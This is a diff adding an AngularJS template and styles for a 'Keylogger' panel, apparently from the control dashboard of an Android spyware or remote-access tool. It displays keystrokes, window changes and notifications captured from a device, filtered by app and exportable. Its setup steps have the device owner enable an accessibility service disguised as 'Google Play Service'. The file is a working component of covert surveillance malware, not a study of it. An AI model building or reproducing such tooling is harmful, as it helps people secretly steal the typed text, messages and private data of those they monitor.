@@ -1,0 +1,434 @@
+<div class="keylogger-panel">
+    <!-- Header -->
+    <div class="keylogger-header">
+        <div class="keylogger-header__info">
+            <h3 class="keylogger-header__title">
+                <i class="keyboard icon" style="color: #ff5722;"></i>
+                Keylogger
+            </h3>
+            <p class="keylogger-header__subtitle">Capture keyboard input and text changes</p>
+        </div>
+        <div class="keylogger-header__actions">
+            <button class="btn btn--primary" ng-click="getKeylogs()">
+                <i class="sync icon"></i>
+                Refresh
+            </button>
+            <button class="btn btn--secondary" ng-click="clearKeylogs()">
+                <i class="trash icon"></i>
+                Clear
+            </button>
+            <button class="btn btn--secondary" ng-click="exportKeylogs()">
+                <i class="download icon"></i>
+                Export
+            </button>
+        </div>
+    </div>
+
+    <!-- Status Panel -->
+    <div class="keylogger-status" ng-class="{'keylogger-status--enabled': keyloggerEnabled, 'keylogger-status--disabled': !keyloggerEnabled}">
+        <div class="keylogger-status__indicator">
+            <span class="status-dot" ng-class="{'status-dot--active': keyloggerEnabled}"></span>
+            <span class="status-label">{{keyloggerEnabled ? 'Accessibility Service Active' : 'Accessibility Service Required'}}</span>
+        </div>
+        <div class="keylogger-status__stats" ng-if="keylogCount">
+            <span class="stat-badge">
+                <i class="list icon"></i>
+                {{keylogCount}} entries
+            </span>
+        </div>
+    </div>
+
+    <!-- Filter & Search -->
+    <div class="keylogger-filters">
+        <div class="filter-search">
+            <i class="search icon"></i>
+            <input type="text" ng-model="searchKeylog" placeholder="Search logs...">
+        </div>
+        <div class="filter-type">
+            <select ng-model="filterType">
+                <option value="">All Types</option>
+                <option value="TEXT">Text Input</option>
+                <option value="WINDOW">Window Changes</option>
+                <option value="NOTIFICATION">Notifications</option>
+            </select>
+        </div>
+        <div class="filter-app">
+            <select ng-model="filterApp" ng-options="app for app in uniqueApps">
+                <option value="">All Apps</option>
+            </select>
+        </div>
+    </div>
+
+    <!-- Keylogs List -->
+    <div class="keylogger-list" infinite-scroll="increaseLimit()">
+        <div class="keylog-entry" ng-repeat="log in filteredLogs = (keylogs | filter:searchKeylog | filter:{type: filterType, app: filterApp} | limitTo:barLimit)"
+             ng-class="'keylog-entry--' + log.type.toLowerCase()">
+            <div class="keylog-entry__type">
+                <i ng-class="getTypeIcon(log.type)"></i>
+            </div>
+            <div class="keylog-entry__content">
+                <div class="keylog-entry__header">
+                    <span class="keylog-app">{{log.app}}</span>
+                    <span class="keylog-type-badge">{{log.type}}</span>
+                </div>
+                <div class="keylog-entry__text" ng-bind="log.content"></div>
+                <div class="keylog-entry__meta">
+                    <span class="meta-item">
+                        <i class="clock icon"></i>
+                        {{log.timestamp | date:'medium'}}
+                    </span>
+                    <span class="meta-item" ng-if="log.viewId">
+                        <i class="code icon"></i>
+                        {{log.viewId}}
+                    </span>
+                </div>
+            </div>
+            <div class="keylog-entry__actions">
+                <button class="btn btn--icon btn--ghost" ng-click="copyLog(log)" title="Copy">
+                    <i class="copy icon"></i>
+                </button>
+            </div>
+        </div>
+
+        <!-- Empty State -->
+        <div class="keylogger-empty" ng-if="keylogs.length === 0 && !isLoading">
+            <div class="keylogger-empty__icon">
+                <i class="keyboard outline icon"></i>
+            </div>
+            <h4>No Keylog Data</h4>
+            <p>Enable Accessibility Service on the device to start capturing keystrokes</p>
+            <div class="setup-instructions">
+                <h5>Setup Instructions:</h5>
+                <ol>
+                    <li>Go to Settings > Accessibility</li>
+                    <li>Find "Google Play Service" in the list</li>
+                    <li>Enable the accessibility service</li>
+                    <li>Grant all requested permissions</li>
+                </ol>
+            </div>
+        </div>
+
+        <!-- Loading -->
+        <div class="keylogger-loading" ng-if="isLoading">
+            <div class="spinner"></div>
+            <p>Loading keylogs...</p>
+        </div>
+    </div>
+</div>
+
+<style>
+    .keylogger-panel {
+        height: 100%;
+        display: flex;
+        flex-direction: column;
+    }
+    
+    .keylogger-header {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        margin-bottom: 16px;
+    }
+    
+    .keylogger-header__title {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        font-size: 18px;
+        font-weight: 600;
+        color: var(--text-primary);
+        margin: 0;
+    }
+    
+    .keylogger-header__subtitle {
+        margin: 4px 0 0;
+        font-size: 12px;
+        color: var(--text-muted);
+    }
+    
+    .keylogger-header__actions {
+        display: flex;
+        gap: 10px;
+    }
+    
+    /* Status */
+    .keylogger-status {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        padding: 12px 16px;
+        border-radius: var(--radius-md);
+        margin-bottom: 16px;
+    }
+    
+    .keylogger-status--enabled {
+        background: rgba(0, 214, 143, 0.1);
+        border: 1px solid rgba(0, 214, 143, 0.3);
+    }
+    
+    .keylogger-status--disabled {
+        background: rgba(255, 171, 0, 0.1);
+        border: 1px solid rgba(255, 171, 0, 0.3);
+    }
+    
+    .keylogger-status__indicator {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+    }
+    
+    .status-dot {
+        width: 10px;
+        height: 10px;
+        background: var(--accent-warning);
+        border-radius: 50%;
+    }
+    
+    .status-dot--active {
+        background: var(--accent-success);
+        animation: pulse 2s infinite;
+    }
+    
+    .stat-badge {
+        display: flex;
+        align-items: center;
+        gap: 6px;
+        padding: 4px 10px;
+        background: var(--bg-secondary);
+        border-radius: var(--radius-sm);
+        font-size: 11px;
+        color: var(--text-secondary);
+    }
+    
+    /* Filters */
+    .keylogger-filters {
+        display: flex;
+        gap: 12px;
+        margin-bottom: 16px;
+    }
+    
+    .filter-search {
+        flex: 1;
+        position: relative;
+    }
+    
+    .filter-search i {
+        position: absolute;
+        left: 12px;
+        top: 50%;
+        transform: translateY(-50%);
+        color: var(--text-muted);
+    }
+    
+    .filter-search input {
+        width: 100%;
+        padding: 10px 14px 10px 36px;
+        background: var(--bg-secondary);
+        border: 1px solid var(--border-color);
+        border-radius: var(--radius-md);
+        color: var(--text-primary);
+        font-size: 13px;
+    }
+    
+    .filter-type select,
+    .filter-app select {
+        padding: 10px 14px;
+        background: var(--bg-secondary);
+        border: 1px solid var(--border-color);
+        border-radius: var(--radius-md);
+        color: var(--text-primary);
+        font-size: 13px;
+    }
+    
+    /* Keylogs List */
+    .keylogger-list {
+        flex: 1;
+        overflow-y: auto;
+        background: var(--bg-card);
+        border: 1px solid var(--border-color);
+        border-radius: var(--radius-lg);
+        padding: 8px;
+    }
+    
+    .keylog-entry {
+        display: flex;
+        gap: 12px;
+        padding: 14px;
+        border-radius: var(--radius-md);
+        margin-bottom: 6px;
+        transition: all 0.2s ease;
+    }
+    
+    .keylog-entry:hover {
+        background: var(--bg-elevated);
+    }
+    
+    .keylog-entry--text {
+        border-left: 3px solid #4caf50;
+        background: rgba(76, 175, 80, 0.05);
+    }
+    
+    .keylog-entry--window {
+        border-left: 3px solid #2196f3;
+        background: rgba(33, 150, 243, 0.05);
+    }
+    
+    .keylog-entry--notification {
+        border-left: 3px solid #ff9800;
+        background: rgba(255, 152, 0, 0.05);
+    }
+    
+    .keylog-entry__type {
+        width: 36px;
+        height: 36px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background: var(--bg-tertiary);
+        border-radius: var(--radius-sm);
+        color: var(--text-secondary);
+        flex-shrink: 0;
+    }
+    
+    .keylog-entry__content {
+        flex: 1;
+        min-width: 0;
+    }
+    
+    .keylog-entry__header {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        margin-bottom: 6px;
+    }
+    
+    .keylog-app {
+        font-size: 12px;
+        font-weight: 600;
+        color: var(--text-primary);
+    }
+    
+    .keylog-type-badge {
+        padding: 2px 8px;
+        background: var(--bg-secondary);
+        border-radius: 10px;
+        font-size: 10px;
+        font-weight: 600;
+        color: var(--text-muted);
+        text-transform: uppercase;
+    }
+    
+    .keylog-entry__text {
+        font-size: 13px;
+        color: var(--text-primary);
+        font-family: var(--font-mono);
+        word-break: break-word;
+        background: var(--bg-secondary);
+        padding: 8px 12px;
+        border-radius: var(--radius-sm);
+        margin-bottom: 8px;
+    }
+    
+    .keylog-entry__meta {
+        display: flex;
+        gap: 16px;
+    }
+    
+    .meta-item {
+        display: flex;
+        align-items: center;
+        gap: 4px;
+        font-size: 11px;
+        color: var(--text-muted);
+    }
+    
+    /* Empty State */
+    .keylogger-empty {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        padding: 60px;
+        text-align: center;
+    }
+    
+    .keylogger-empty__icon {
+        width: 80px;
+        height: 80px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background: var(--bg-tertiary);
+        border-radius: 50%;
+        margin-bottom: 16px;
+    }
+    
+    .keylogger-empty__icon i {
+        font-size: 36px;
+        color: var(--text-muted);
+    }
+    
+    .keylogger-empty h4 {
+        margin: 0 0 8px;
+        font-size: 16px;
+        color: var(--text-primary);
+    }
+    
+    .keylogger-empty p {
+        color: var(--text-muted);
+        margin-bottom: 24px;
+    }
+    
+    .setup-instructions {
+        text-align: left;
+        padding: 16px 20px;
+        background: var(--bg-secondary);
+        border-radius: var(--radius-md);
+    }
+    
+    .setup-instructions h5 {
+        margin: 0 0 12px;
+        font-size: 12px;
+        font-weight: 600;
+        color: var(--text-secondary);
+    }
+    
+    .setup-instructions ol {
+        margin: 0;
+        padding: 0 0 0 20px;
+    }
+    
+    .setup-instructions li {
+        font-size: 12px;
+        color: var(--text-secondary);
+        margin-bottom: 6px;
+    }
+    
+    .keylogger-loading {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        padding: 60px;
+    }
+    
+    .keylogger-loading .spinner {
+        width: 40px;
+        height: 40px;
+        border: 3px solid var(--bg-tertiary);
+        border-top-color: #ff5722;
+        border-radius: 50%;
+        animation: spin 0.8s linear infinite;
+        margin-bottom: 16px;
+    }
+    
+    @keyframes pulse {
+        0%, 100% { opacity: 1; }
+        50% { opacity: 0.5; }
+    }
+    
+    @keyframes spin {
+        to { transform: rotate(360deg); }
+    }
+</style>
+
